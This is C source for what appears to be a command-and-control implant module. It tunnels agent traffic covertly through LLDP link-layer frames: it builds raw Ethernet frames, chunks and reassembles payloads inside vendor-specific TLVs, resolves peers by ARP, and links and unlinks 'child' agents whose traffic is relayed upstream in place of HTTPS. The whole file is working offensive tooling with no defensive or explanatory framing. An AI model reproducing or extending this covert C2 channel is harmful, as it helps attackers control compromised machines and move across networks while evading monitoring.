#include "starburst.h"

#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <net/if.h>
#include <sys/ioctl.h>

#define ETH_P_LLDP          0x88CC
#define LLDP_TLV_END        0
#define LLDP_TLV_CHASSIS_ID 1
#define LLDP_TLV_PORT_ID    2
#define LLDP_TLV_TTL        3
#define LLDP_TLV_ORG_SPEC   127

#define LLDP_CHASSIS_MAC    4
#define LLDP_PORT_LOCAL     7

#define LLDP_MAX_CHUNK_DATA      499
#define LLDP_CHUNK_HDR_SIZE      8
#define LLDP_MAX_FRAME           1514
#define LLDP_RECV_TIMEOUT        3000
#define LLDP_ORG_TLV_OVERHEAD    14   /* hdr(2) + oui(3) + subtype(1) + chunk_hdr(8) */
#define LLDP_MAX_TLVS_PER_FRAME  3
#define MAX_LLDP_PKTS_PER_LOOP   30

typedef struct {
    uint32_t msg_id;
    uint16_t seq_no;
    uint16_t total;
    uint8_t  data[LLDP_MAX_CHUNK_DATA];
    uint16_t data_len;
} lldp_parsed_chunk_t;

static const uint8_t LLDP_MCAST[6] = {0x01, 0x80, 0xC2, 0x00, 0x00, 0x0E};

/* ================================================================
 *  ARP RESOLUTION (IP -> MAC)
 * ================================================================ */

static int resolve_ip_to_mac(const char *ip, uint8_t *mac_out) {
    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(1);
    if (inet_pton(AF_INET, ip, &sa.sin_addr) != 1) return -1;

    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s >= 0) {
        sendto(s, "", 0, 0, (struct sockaddr *)&sa, sizeof(sa));
        close(s);
        usleep(200000);
    }

    FILE *fp = fopen("/proc/net/arp", "r");
    if (!fp) return -1;

    char line[256];
    fgets(line, sizeof(line), fp);
    while (fgets(line, sizeof(line), fp)) {
        char arp_ip[64], arp_mac[32], arp_dev[32];
        int hw_type, flags;
        if (sscanf(line, "%63s 0x%x 0x%x %31s %*s %31s",
                   arp_ip, &hw_type, &flags, arp_mac, arp_dev) >= 4) {
            if (strcmp(arp_ip, ip) == 0 && flags != 0) {
                unsigned int m[6];
                if (sscanf(arp_mac, "%x:%x:%x:%x:%x:%x",
                           &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]) == 6) {
                    for (int i = 0; i < 6; i++) mac_out[i] = (uint8_t)m[i];
                    fclose(fp);
                    return 0;
                }
            }
        }
    }
    fclose(fp);
    return -1;
}

/* ================================================================
 *  TLV HELPERS
 * ================================================================ */

static void tlv_write_hdr(uint8_t *buf, uint8_t type, uint16_t length) {
    uint16_t hdr = ((uint16_t)type << 9) | (length & 0x01FF);
    buf[0] = (hdr >> 8) & 0xFF;
    buf[1] = hdr & 0xFF;
}

static int tlv_read_hdr(const uint8_t *buf, uint8_t *type, uint16_t *length) {
    uint16_t hdr = ((uint16_t)buf[0] << 8) | buf[1];
    *type = (hdr >> 9) & 0x7F;
    *length = hdr & 0x01FF;
    return 2;
}

/* ================================================================
 *  FRAME BUILDING
 * ================================================================ */

static uint32_t lldp_build_frame(uint8_t *frame, const uint8_t *dst_mac,
                                 const uint8_t *src_mac, const uint8_t *oui,
                                 uint8_t subtype, uint32_t msg_id,
                                 uint16_t seq_no, uint16_t total_chunks,
                                 const uint8_t *chunk_data, uint16_t chunk_len) {
    uint8_t *p = frame;

    memcpy(p, dst_mac, 6); p += 6;
    memcpy(p, src_mac, 6); p += 6;
    p[0] = 0x88; p[1] = 0xCC; p += 2;

    /* Chassis ID TLV: subtype MAC */
    tlv_write_hdr(p, LLDP_TLV_CHASSIS_ID, 7); p += 2;
    *p++ = LLDP_CHASSIS_MAC;
    memcpy(p, src_mac, 6); p += 6;

    /* Port ID TLV: subtype local, "lldp" */
    tlv_write_hdr(p, LLDP_TLV_PORT_ID, 5); p += 2;
    *p++ = LLDP_PORT_LOCAL;
    memcpy(p, "lldp", 4); p += 4;

    /* TTL TLV */
    tlv_write_hdr(p, LLDP_TLV_TTL, 2); p += 2;
    p[0] = 0; p[1] = 120; p += 2;

    /* Org-Specific TLV with chunk data */
    uint16_t org_len = 3 + 1 + LLDP_CHUNK_HDR_SIZE + chunk_len;
    tlv_write_hdr(p, LLDP_TLV_ORG_SPEC, org_len); p += 2;
    memcpy(p, oui, 3); p += 3;
    *p++ = subtype;

    /* chunk header: msg_id(4) + seq_no(2) + total(2) */
    p[0] = (msg_id >> 24) & 0xFF;
    p[1] = (msg_id >> 16) & 0xFF;
    p[2] = (msg_id >> 8) & 0xFF;
    p[3] = msg_id & 0xFF;
    p[4] = (seq_no >> 8) & 0xFF;
    p[5] = seq_no & 0xFF;
    p[6] = (total_chunks >> 8) & 0xFF;
    p[7] = total_chunks & 0xFF;
    p += 8;

    if (chunk_len > 0 && chunk_data)
        memcpy(p, chunk_data, chunk_len);
    p += chunk_len;

    /* End TLV */
    tlv_write_hdr(p, LLDP_TLV_END, 0); p += 2;

    return (uint32_t)(p - frame);
}

/* ================================================================
 *  FRAME PARSING
 * ================================================================ */

static int lldp_parse_frame(const uint8_t *frame, uint32_t frame_len,
                            const uint8_t *oui, uint8_t subtype,
                            uint8_t *src_mac_out, uint32_t *msg_id_out,
                            uint16_t *seq_no_out, uint16_t *total_out,
                            uint8_t *data_out, uint16_t *data_len_out) {
    if (frame_len < 14) return -1;

    uint16_t ethertype = ((uint16_t)frame[12] << 8) | frame[13];
    if (ethertype != ETH_P_LLDP) return -1;

    if (src_mac_out) memcpy(src_mac_out, frame + 6, 6);

    const uint8_t *p = frame + 14;
    uint32_t remaining = frame_len - 14;

    while (remaining >= 2) {
        uint8_t tlv_type;
        uint16_t tlv_len;
        tlv_read_hdr(p, &tlv_type, &tlv_len);
        p += 2; remaining -= 2;

        if (tlv_type == LLDP_TLV_END) break;
        if (tlv_len > remaining) return -1;

        if (tlv_type == LLDP_TLV_ORG_SPEC && tlv_len >= 4 + LLDP_CHUNK_HDR_SIZE) {
            if (memcmp(p, oui, 3) == 0 && p[3] == subtype) {
                const uint8_t *hdr = p + 4;
                *msg_id_out = ((uint32_t)hdr[0] << 24) | ((uint32_t)hdr[1] << 16) |
                              ((uint32_t)hdr[2] << 8) | hdr[3];
                *seq_no_out = ((uint16_t)hdr[4] << 8) | hdr[5];
                *total_out = ((uint16_t)hdr[6] << 8) | hdr[7];
                uint16_t dlen = tlv_len - 4 - LLDP_CHUNK_HDR_SIZE;
                if (data_out && dlen > 0)
                    memcpy(data_out, hdr + LLDP_CHUNK_HDR_SIZE, dlen);
                *data_len_out = dlen;
                return 0;
            }
        }

        p += tlv_len;
        remaining -= tlv_len;
    }

    return -1;
}

static int lldp_parse_frame_multi(const uint8_t *frame, uint32_t frame_len,
                                  const uint8_t *oui, uint8_t subtype,
                                  uint8_t *src_mac_out,
                                  lldp_parsed_chunk_t *out, int max_out) {
    if (frame_len < 14) return 0;
    uint16_t ethertype = ((uint16_t)frame[12] << 8) | frame[13];
    if (ethertype != ETH_P_LLDP) return 0;
    if (src_mac_out) memcpy(src_mac_out, frame + 6, 6);

    const uint8_t *p = frame + 14;
    uint32_t remaining = frame_len - 14;
    int count = 0;

    while (remaining >= 2 && count < max_out) {
        uint8_t tlv_type;
        uint16_t tlv_len;
        tlv_read_hdr(p, &tlv_type, &tlv_len);
        p += 2; remaining -= 2;
        if (tlv_type == LLDP_TLV_END) break;
        if (tlv_len > remaining) break;

        if (tlv_type == LLDP_TLV_ORG_SPEC && tlv_len >= 4 + LLDP_CHUNK_HDR_SIZE) {
            if (memcmp(p, oui, 3) == 0 && p[3] == subtype) {
                const uint8_t *hdr = p + 4;
                out[count].msg_id = ((uint32_t)hdr[0] << 24) | ((uint32_t)hdr[1] << 16) |
                                    ((uint32_t)hdr[2] << 8) | hdr[3];
                out[count].seq_no = ((uint16_t)hdr[4] << 8) | hdr[5];
                out[count].total  = ((uint16_t)hdr[6] << 8) | hdr[7];
                uint16_t dlen = tlv_len - 4 - LLDP_CHUNK_HDR_SIZE;
                if (dlen > LLDP_MAX_CHUNK_DATA) dlen = LLDP_MAX_CHUNK_DATA;
                if (dlen > 0) memcpy(out[count].data, hdr + LLDP_CHUNK_HDR_SIZE, dlen);
                out[count].data_len = dlen;
                count++;
            }
        }
        p += tlv_len;
        remaining -= tlv_len;
    }
    return count;
}

/* ================================================================
 *  RAW SOCKET
 * ================================================================ */

static int lldp_open_socket(const char *iface, uint8_t *mac_out, int *ifindex_out) {
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_LLDP));
    if (sock < 0) {
        DBG("lldp: socket() failed: %s", strerror(errno));
        return -1;
    }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);

    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        DBG("lldp: SIOCGIFHWADDR failed: %s", strerror(errno));
        close(sock);
        return -1;
    }
    memcpy(mac_out, ifr.ifr_hwaddr.sa_data, 6);

    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
        DBG("lldp: SIOCGIFINDEX failed: %s", strerror(errno));
        close(sock);
        return -1;
    }
    *ifindex_out = ifr.ifr_ifindex;

    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_protocol = htons(ETH_P_LLDP);
    sll.sll_ifindex = ifr.ifr_ifindex;

    if (bind(sock, (struct sockaddr *)&sll, sizeof(sll)) < 0) {
        DBG("lldp: bind failed: %s", strerror(errno));
        close(sock);
        return -1;
    }

    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    DBG("lldp: socket opened on %s (ifindex=%d)", iface, ifr.ifr_ifindex);
    return sock;
}

/* ================================================================
 *  SEND / RECEIVE WITH CHUNKING
 * ================================================================ */

static int lldp_send_raw(int sock, int ifindex, const uint8_t *frame, uint32_t frame_len) {
    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_protocol = htons(ETH_P_LLDP);
    sll.sll_ifindex = ifindex;
    sll.sll_halen = 6;
    memcpy(sll.sll_addr, frame, 6);

    ssize_t r = sendto(sock, frame, frame_len, 0, (struct sockaddr *)&sll, sizeof(sll));
    return r > 0 ? 0 : -1;
}

static int lldp_send_data(int sock, int ifindex, const uint8_t *dst_mac,
                          const uint8_t *src_mac, const uint8_t *oui,
                          uint8_t subtype, const uint8_t *data, uint32_t data_len) {
    uint32_t msg_id = (uint32_t)(time(NULL) ^ getpid()) & 0x7FFFFFFF;
    uint16_t total = (uint16_t)((data_len + LLDP_MAX_CHUNK_DATA - 1) / LLDP_MAX_CHUNK_DATA);
    if (total == 0) total = 1;

    uint8_t frame[LLDP_MAX_FRAME];
    uint16_t seq = 0;

    while (seq < total) {
        uint8_t *p = frame;

        memcpy(p, dst_mac, 6); p += 6;
        memcpy(p, src_mac, 6); p += 6;
        p[0] = 0x88; p[1] = 0xCC; p += 2;

        tlv_write_hdr(p, LLDP_TLV_CHASSIS_ID, 7); p += 2;
        *p++ = LLDP_CHASSIS_MAC;
        memcpy(p, src_mac, 6); p += 6;

        tlv_write_hdr(p, LLDP_TLV_PORT_ID, 5); p += 2;
        *p++ = LLDP_PORT_LOCAL;
        memcpy(p, "lldp", 4); p += 4;

        tlv_write_hdr(p, LLDP_TLV_TTL, 2); p += 2;
        p[0] = 0; p[1] = 120; p += 2;

        while (seq < total) {
            uint32_t off = (uint32_t)seq * LLDP_MAX_CHUNK_DATA;
            uint16_t clen = (uint16_t)(data_len - off);
            if (clen > LLDP_MAX_CHUNK_DATA) clen = LLDP_MAX_CHUNK_DATA;

            uint16_t org_len = 3 + 1 + LLDP_CHUNK_HDR_SIZE + clen;
            if ((uint32_t)(p - frame) + 2 + org_len + 2 > LLDP_MAX_FRAME)
                break;

            tlv_write_hdr(p, LLDP_TLV_ORG_SPEC, org_len); p += 2;
            memcpy(p, oui, 3); p += 3;
            *p++ = subtype;

            p[0] = (msg_id >> 24) & 0xFF;
            p[1] = (msg_id >> 16) & 0xFF;
            p[2] = (msg_id >> 8) & 0xFF;
            p[3] = msg_id & 0xFF;
            p[4] = (seq >> 8) & 0xFF;
            p[5] = seq & 0xFF;
            p[6] = (total >> 8) & 0xFF;
            p[7] = total & 0xFF;
            p += 8;

            if (clen > 0) memcpy(p, data + off, clen);
            p += clen;
            seq++;
        }

        tlv_write_hdr(p, LLDP_TLV_END, 0); p += 2;

        if (lldp_send_raw(sock, ifindex, frame, (uint32_t)(p - frame)) < 0) {
            DBG("lldp: send frame failed at seq %u/%u", seq, total);
            return -1;
        }
        usleep(1000);
    }

    return 0;
}

typedef struct {
    uint32_t msg_id;
    uint16_t total;
    uint16_t received;
    uint8_t  src_mac[6];
    uint8_t  *chunks[256];
    uint16_t chunk_lens[256];
    uint8_t  chunk_present[256];
} reassembly_ctx_t;

static int lldp_recv_message(int sock, const uint8_t *oui, uint8_t subtype,
                             uint8_t *src_mac_out, uint8_t **data_out,
                             uint32_t *data_len_out, int timeout_ms) {
    *data_out = NULL;
    *data_len_out = 0;

    reassembly_ctx_t ctx;
    memset(&ctx, 0, sizeof(ctx));

    int elapsed = 0;
    uint8_t frame[LLDP_MAX_FRAME];

    while (elapsed < timeout_ms) {
        fd_set rset;
        FD_ZERO(&rset);
        FD_SET(sock, &rset);
        struct timeval tv = { 0, 50000 };

        int ready = select(sock + 1, &rset, NULL, NULL, &tv);
        if (ready <= 0) {
            elapsed += 50;
            continue;
        }

        ssize_t n = recv(sock, frame, sizeof(frame), 0);
        if (n <= 0) { elapsed += 50; continue; }

        uint8_t peer_mac[6];
        lldp_parsed_chunk_t parsed[LLDP_MAX_TLVS_PER_FRAME];
        int nchunks = lldp_parse_frame_multi(frame, (uint32_t)n, oui, subtype,
                                             peer_mac, parsed, LLDP_MAX_TLVS_PER_FRAME);
        if (nchunks <= 0) continue;

        for (int ci = 0; ci < nchunks; ci++) {
            if (ctx.msg_id == 0) {
                ctx.msg_id = parsed[ci].msg_id;
                ctx.total = parsed[ci].total;
                memcpy(ctx.src_mac, peer_mac, 6);
            }

            if (parsed[ci].msg_id != ctx.msg_id) continue;
            if (parsed[ci].seq_no >= 256 || parsed[ci].seq_no >= parsed[ci].total) continue;

            if (!ctx.chunk_present[parsed[ci].seq_no]) {
                ctx.chunks[parsed[ci].seq_no] = (uint8_t *)malloc(parsed[ci].data_len);
                memcpy(ctx.chunks[parsed[ci].seq_no], parsed[ci].data, parsed[ci].data_len);
                ctx.chunk_lens[parsed[ci].seq_no] = parsed[ci].data_len;
                ctx.chunk_present[parsed[ci].seq_no] = 1;
                ctx.received++;
            }
        }

        if (ctx.received >= ctx.total) break;
    }

    if (ctx.received == 0 || ctx.received < ctx.total) {
        for (uint16_t i = 0; i < 256; i++)
            if (ctx.chunks[i]) free(ctx.chunks[i]);
        return -1;
    }

    uint32_t total_len = 0;
    for (uint16_t i = 0; i < ctx.total; i++)
        total_len += ctx.chunk_lens[i];

    uint8_t *buf = (uint8_t *)malloc(total_len);
    uint32_t off = 0;
    for (uint16_t i = 0; i < ctx.total; i++) {
        memcpy(buf + off, ctx.chunks[i], ctx.chunk_lens[i]);
        off += ctx.chunk_lens[i];
        free(ctx.chunks[i]);
    }

    memcpy(src_mac_out, ctx.src_mac, 6);
    *data_out = buf;
    *data_len_out = total_len;
    return 0;
}

/* ================================================================
 *  LLDP P2P LINK MANAGEMENT
 * ================================================================ */

static void lldp_link_rx_reset(lldp_link_t *link) {
    for (uint16_t i = 0; i < 256; i++) {
        if (link->rx_chunks[i]) { free(link->rx_chunks[i]); link->rx_chunks[i] = NULL; }
        link->rx_chunk_lens[i] = 0;
        link->rx_chunk_present[i] = 0;
    }
    link->rx_msg_id = 0;
    link->rx_total = 0;
    link->rx_received = 0;
}

static void lldp_link_queue_assembled(lldp_link_t *link) {
    uint32_t total_len = 0;
    for (uint16_t i = 0; i < link->rx_total; i++)
        total_len += link->rx_chunk_lens[i];

    uint8_t *buf = (uint8_t *)malloc(total_len);
    if (!buf) { lldp_link_rx_reset(link); return; }

    uint32_t off = 0;
    for (uint16_t i = 0; i < link->rx_total; i++) {
        memcpy(buf + off, link->rx_chunks[i], link->rx_chunk_lens[i]);
        off += link->rx_chunk_lens[i];
    }

    size_t dec_len = 0;
    uint8_t *dec = b64_decode((char *)buf, total_len > 64 ? 64 : total_len, &dec_len);
    if (dec && dec_len >= 36) {
        char new_uuid[40];
        memcpy(new_uuid, dec, 36);
        new_uuid[36] = '\0';
        if (strcmp(link->agent_id, new_uuid) != 0) {
            DBG("lldp_poll: updating link uuid %s -> %s", link->agent_id, new_uuid);
            strncpy(link->agent_id, new_uuid, 39);
            link->agent_id[39] = '\0';
        }
    }
    if (dec) free(dec);

    packer_t dpkg;
    pk_init(&dpkg);
    pk_byte(&dpkg, ACTION_LINK_MSG);
    pk_string(&dpkg, link->agent_id);
    pk_bytes(&dpkg, buf, total_len);

    DBG("lldp_poll: queued delegate for %s (%u bytes)", link->agent_id, total_len);

    pthread_mutex_lock(&g_state.rsp_mutex);
    rsp_queue(dpkg.data, dpkg.len);
    pthread_mutex_unlock(&g_state.rsp_mutex);

    pk_free(&dpkg);
    free(buf);
    lldp_link_rx_reset(link);
}

void lldp_p2p_poll_links(void) {
    if (g_state.lldp_sock < 0) return;

    uint8_t frame[LLDP_MAX_FRAME];
    int pkts = 0;

    while (pkts < MAX_LLDP_PKTS_PER_LOOP) {
        fd_set rset;
        FD_ZERO(&rset);
        FD_SET(g_state.lldp_sock, &rset);
        struct timeval tv = { 0, 0 };
        if (select(g_state.lldp_sock + 1, &rset, NULL, NULL, &tv) <= 0) break;

        ssize_t n = recv(g_state.lldp_sock, frame, sizeof(frame), 0);
        if (n <= 0) break;

        uint8_t peer_mac[6];
        lldp_parsed_chunk_t parsed[LLDP_MAX_TLVS_PER_FRAME];
        int nchunks = lldp_parse_frame_multi(frame, (uint32_t)n,
                          g_state.lldp_oui, g_state.lldp_subtype,
                          peer_mac, parsed, LLDP_MAX_TLVS_PER_FRAME);
        if (nchunks <= 0) continue;

        if (memcmp(peer_mac, g_state.lldp_src_mac, 6) == 0) continue;

        lldp_link_t *link = g_state.lldp_links;
        while (link) {
            if (link->connected && memcmp(link->peer_mac, peer_mac, 6) == 0)
                break;
            link = link->next;
        }
        if (!link) continue;

        for (int ci = 0; ci < nchunks; ci++) {
            uint32_t msg_id = parsed[ci].msg_id;
            uint16_t total  = parsed[ci].total;
            uint16_t seq_no = parsed[ci].seq_no;
            uint16_t chunk_len = parsed[ci].data_len;

            if (seq_no >= 256 || seq_no >= total) continue;

            if (link->rx_msg_id != 0 && link->rx_msg_id != msg_id) {
                lldp_link_rx_reset(link);
            }
            if (link->rx_msg_id == 0) {
                link->rx_msg_id = msg_id;
                link->rx_total = total;
            }

            if (!link->rx_chunk_present[seq_no]) {
                link->rx_chunks[seq_no] = (uint8_t *)malloc(chunk_len);
                if (link->rx_chunks[seq_no]) {
                    memcpy(link->rx_chunks[seq_no], parsed[ci].data, chunk_len);
                    link->rx_chunk_lens[seq_no] = chunk_len;
                    link->rx_chunk_present[seq_no] = 1;
                    link->rx_received++;
                }
            }

            if (link->rx_received >= link->rx_total) {
                lldp_link_queue_assembled(link);
            }
        }

        pkts++;
    }
}

int lldp_p2p_link_send(lldp_link_t *link, const uint8_t *data, uint32_t len) {
    if (!link || g_state.lldp_sock < 0) return -1;
    return lldp_send_data(g_state.lldp_sock, g_state.lldp_ifindex,
                          link->peer_mac, g_state.lldp_src_mac,
                          g_state.lldp_oui, g_state.lldp_subtype, data, len);
}

void lldp_p2p_destroy(void) {
    if (g_state.lldp_sock >= 0) {
        close(g_state.lldp_sock);
        g_state.lldp_sock = -1;
    }

    lldp_link_t *cur = g_state.lldp_links;
    while (cur) {
        lldp_link_t *next = cur->next;
        lldp_link_rx_reset(cur);
        free(cur);
        cur = next;
    }
    g_state.lldp_links = NULL;
}

/* ================================================================
 *  CONNECT / DISCONNECT
 * ================================================================ */

void cmd_lldp_connect_handler(const char *task_uuid, parser_t *params) {
    char *iface = pr_string(params);
    char *oui_hex = pr_string(params);

    if (!iface || strlen(iface) == 0) {
        queue_response(task_uuid, RSP_ERROR, "missing interface name");
        free(iface); free(oui_hex);
        return;
    }

    uint8_t oui[3] = {0x00, 0x00, 0x0C};
    if (oui_hex && strlen(oui_hex) >= 6) {
        for (int i = 0; i < 3; i++) {
            char byte_str[3] = { oui_hex[i*2], oui_hex[i*2+1], 0 };
            oui[i] = (uint8_t)strtoul(byte_str, NULL, 16);
        }
    }
    uint8_t subtype = pr_byte(params);
    if (subtype == 0) subtype = 0x01;

    char *peer_ip = NULL;
    uint8_t peer_mac_resolved[6] = {0};
    int have_peer_mac = 0;
    if (pr_remaining(params) > 0) {
        peer_ip = pr_string(params);
        if (peer_ip && strlen(peer_ip) > 0) {
            if (resolve_ip_to_mac(peer_ip, peer_mac_resolved) == 0) {
                have_peer_mac = 1;
                DBG("lldp_connect: resolved %s -> %02x:%02x:%02x:%02x:%02x:%02x",
                    peer_ip, peer_mac_resolved[0], peer_mac_resolved[1],
                    peer_mac_resolved[2], peer_mac_resolved[3],
                    peer_mac_resolved[4], peer_mac_resolved[5]);
            } else {
                DBG("lldp_connect: ARP resolution failed for %s, using broadcast", peer_ip);
            }
        }
    }

    /* open socket if not already open on this interface */
    if (g_state.lldp_sock < 0) {
        uint8_t mac[6];
        int ifindex;
        int sock = lldp_open_socket(iface, mac, &ifindex);
        if (sock < 0) {
            queue_response(task_uuid, RSP_ERROR, "failed to open LLDP socket");
            free(iface); free(oui_hex); free(peer_ip);
            return;
        }
        g_state.lldp_sock = sock;
        g_state.lldp_ifindex = ifindex;
        memcpy(g_state.lldp_src_mac, mac, 6);
        memcpy(g_state.lldp_oui, oui, 3);
        g_state.lldp_subtype = subtype;
        strncpy(g_state.lldp_iface, iface, sizeof(g_state.lldp_iface) - 1);
    }

    DBG("lldp_connect: listening on %s for OUI %02x%02x%02x subtype %02x",
        iface, oui[0], oui[1], oui[2], subtype);

    /* wait for a P2P child's checkin over LLDP */
    uint8_t peer_mac[6];
    uint8_t *p2p_data = NULL;
    uint32_t p2p_len = 0;

    if (lldp_recv_message(g_state.lldp_sock, oui, subtype, peer_mac,
                          &p2p_data, &p2p_len, 45000) < 0 || !p2p_data || p2p_len == 0) {
        queue_response(task_uuid, RSP_ERROR, "no LLDP response from P2P agent");
        free(iface); free(oui_hex); free(peer_ip);
        return;
    }

    lldp_link_t *link = (lldp_link_t *)calloc(1, sizeof(lldp_link_t));
    strncpy(link->task_uuid, task_uuid, 39);
    link->link_id = (uint32_t)(time(NULL) ^ getpid()) & 0x7FFFFFFF;
    memcpy(link->peer_mac, peer_mac, 6);
    link->connected = 1;

    /* extract UUID from P2P agent's response */
    size_t decoded_len;
    uint8_t *decoded = b64_decode((char *)p2p_data, p2p_len > 48 ? 48 : p2p_len, &decoded_len);
    if (decoded && decoded_len >= 36) {
        memcpy(link->agent_id, decoded, 36);
        link->agent_id[36] = '\0';
    }
    if (decoded) free(decoded);

    link->next = g_state.lldp_links;
    g_state.lldp_links = link;

    /* queue LINK_ADD response */
    packer_t pkg;
    pk_init(&pkg);
    pk_byte(&pkg, ACTION_LINK_ADD);
    pk_byte(&pkg, C2_PROFILE_LLDP);
    pk_int32(&pkg, link->link_id);
    pk_string(&pkg, link->agent_id);
    pk_bytes(&pkg, p2p_data, p2p_len);

    pthread_mutex_lock(&g_state.rsp_mutex);
    rsp_queue(pkg.data, pkg.len);
    pthread_mutex_unlock(&g_state.rsp_mutex);

    pk_free(&pkg);
    free(p2p_data);

    char msg[512];
    snprintf(msg, sizeof(msg), "LLDP linked to %02x:%02x:%02x:%02x:%02x:%02x\nAgent: %s",
             peer_mac[0], peer_mac[1], peer_mac[2],
             peer_mac[3], peer_mac[4], peer_mac[5], link->agent_id);
    queue_response(task_uuid, RSP_SUCCESS, msg);
    free(iface); free(oui_hex); free(peer_ip);
}

void cmd_lldp_disconnect_handler(const char *task_uuid, parser_t *params) {
    char *agent_uuid = pr_string(params);

    lldp_link_t *prev = NULL;
    lldp_link_t *cur = g_state.lldp_links;
    while (cur) {
        if (strcmp(cur->agent_id, agent_uuid) == 0) {
            if (prev) prev->next = cur->next;
            else g_state.lldp_links = cur->next;

            packer_t rpkg;
            pk_init(&rpkg);
            pk_byte(&rpkg, ACTION_LINK_REMOVE);
            pk_int32(&rpkg, cur->link_id);
            pk_string(&rpkg, cur->agent_id);

            pthread_mutex_lock(&g_state.rsp_mutex);
            rsp_queue(rpkg.data, rpkg.len);
            pthread_mutex_unlock(&g_state.rsp_mutex);

            pk_free(&rpkg);
            lldp_link_rx_reset(cur);
            free(cur);

            queue_response(task_uuid, RSP_SUCCESS, "LLDP link disconnected");
            free(agent_uuid);
            return;
        }
        prev = cur;
        cur = cur->next;
    }

    queue_response(task_uuid, RSP_ERROR, "LLDP link not found");
    free(agent_uuid);
}

/* ================================================================
 *  LLDP P2P CHILD TRANSPORT
 *  Used when built with LLDP_TRANSPORT: the child agent sends
 *  all data over LLDP frames instead of HTTPS.
 * ================================================================ */

static const uint8_t LLDP_BCAST[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

int lldp_p2p_child_init(void) {
    if (g_state.lldp_sock >= 0) return 0;

    const char *iface = CFG_LLDP_IFACE;
    uint8_t mac[6];
    int ifindex;
    int sock = lldp_open_socket(iface, mac, &ifindex);
    if (sock < 0) {
        DBG("lldp_p2p_child_init: failed to open socket on %s", iface);
        return -1;
    }

    g_state.lldp_sock = sock;
    g_state.lldp_ifindex = ifindex;
    memcpy(g_state.lldp_src_mac, mac, 6);
    g_state.lldp_oui[0] = CFG_LLDP_OUI_0;
    g_state.lldp_oui[1] = CFG_LLDP_OUI_1;
    g_state.lldp_oui[2] = CFG_LLDP_OUI_2;
    g_state.lldp_subtype = CFG_LLDP_SUBTYPE;
    strncpy(g_state.lldp_iface, iface, sizeof(g_state.lldp_iface) - 1);

    const char *peer_ip = CFG_LLDP_PEER_IP;
    g_state.lldp_has_peer = 0;
    if (peer_ip && strlen(peer_ip) > 0) {
        int retries = 3;
        while (retries-- > 0) {
            if (resolve_ip_to_mac(peer_ip, g_state.lldp_peer_mac) == 0) {
                g_state.lldp_has_peer = 1;
                DBG("lldp_p2p_child_init: resolved peer %s -> %02x:%02x:%02x:%02x:%02x:%02x",
                    peer_ip, g_state.lldp_peer_mac[0], g_state.lldp_peer_mac[1],
                    g_state.lldp_peer_mac[2], g_state.lldp_peer_mac[3],
                    g_state.lldp_peer_mac[4], g_state.lldp_peer_mac[5]);
                break;
            }
            DBG("lldp_p2p_child_init: ARP retry for %s (%d left)", peer_ip, retries);
            usleep(500000);
        }
        if (!g_state.lldp_has_peer)
            DBG("lldp_p2p_child_init: ARP resolution failed for %s, using broadcast", peer_ip);
    }

    DBG("lldp_p2p_child_init: ready on %s mac=%02x:%02x:%02x:%02x:%02x:%02x oui=%02x%02x%02x",
        iface, mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],
        g_state.lldp_oui[0], g_state.lldp_oui[1], g_state.lldp_oui[2]);
    return 0;
}

uint8_t *lldp_p2p_send(const uint8_t *data, uint32_t data_len, uint32_t *resp_len) {
    *resp_len = 0;
    if (g_state.lldp_sock < 0) return NULL;

    /* drain any stale frames (including looped-back self-frames) */
    uint8_t drain_buf[LLDP_MAX_FRAME];
    while (recv(g_state.lldp_sock, drain_buf, sizeof(drain_buf), MSG_DONTWAIT) > 0) {}

    DBG("lldp_p2p_send: sending %u bytes", data_len);

    const uint8_t *dst = g_state.lldp_has_peer ? g_state.lldp_peer_mac : LLDP_BCAST;

    if (lldp_send_data(g_state.lldp_sock, g_state.lldp_ifindex,
                       dst, g_state.lldp_src_mac,
                       g_state.lldp_oui, g_state.lldp_subtype,
                       data, data_len) < 0) {
        DBG("lldp_p2p_send: send failed");
        return NULL;
    }

    /* brief pause to let self-frames settle before receiving */
    usleep(5000);
    while (recv(g_state.lldp_sock, drain_buf, sizeof(drain_buf), MSG_DONTWAIT) > 0) {}

    uint8_t peer_mac[6];
    uint8_t *resp_data = NULL;
    uint32_t resp_data_len = 0;

    if (lldp_recv_message(g_state.lldp_sock, g_state.lldp_oui, g_state.lldp_subtype,
                          peer_mac, &resp_data, &resp_data_len, 30000) < 0) {
        DBG("lldp_p2p_send: recv timeout");
        return NULL;
    }

    DBG("lldp_p2p_send: received %u bytes from %02x:%02x:%02x:%02x:%02x:%02x",
        resp_data_len, peer_mac[0], peer_mac[1], peer_mac[2],
        peer_mac[3], peer_mac[4], peer_mac[5]);

    *resp_len = resp_data_len;
    return resp_data;
}
